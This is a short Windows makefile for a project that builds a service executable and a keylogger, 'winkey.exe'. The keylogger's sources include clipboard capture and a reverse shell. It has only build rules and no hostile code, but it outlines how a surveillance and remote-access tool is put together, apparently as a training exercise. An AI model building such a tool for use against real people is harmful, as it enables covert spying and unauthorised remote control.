SERVICE			= svc.exe
KEYLOGGER		= winkey.exe

CC				= cl
CFLAGS			= /Wall /WX
LINK			= link
RM				= del

SRC_SERVICE		= .\service\srcs\main.c .\service\srcs\service.c
SRC_KEYLOGGER	= .\keylogger\srcs\main.c .\keylogger\srcs\clipboard.c .\keylogger\srcs\reverse_shell.c

OBJ_SERVICE		= $(SRC_SERVICE:.c=.obj)
OBJ_KEYLOGGER	= $(SRC_KEYLOGGER:.c=.obj)


all: $(SERVICE) $(KEYLOGGER)

$(SERVICE): $(OBJ_SERVICE)
	$(LINK) /nologo $(OBJ_SERVICE) /OUT:$@

$(KEYLOGGER): $(OBJ_KEYLOGGER)
	$(LINK) /nologo $(OBJ_KEYLOGGER) /OUT:$@

.c.obj:
	$(CC) $(CFLAGS) /nologo /I.\keylogger\include /I.\service\include /c $< /Fo: $@

clean:
	$(RM) $(OBJ_SERVICE) $(OBJ_KEYLOGGER)

fclean: clean
	$(RM) $(SERVICE) $(KEYLOGGER)

re: fclean all

.PHONY: all clean fclean re 
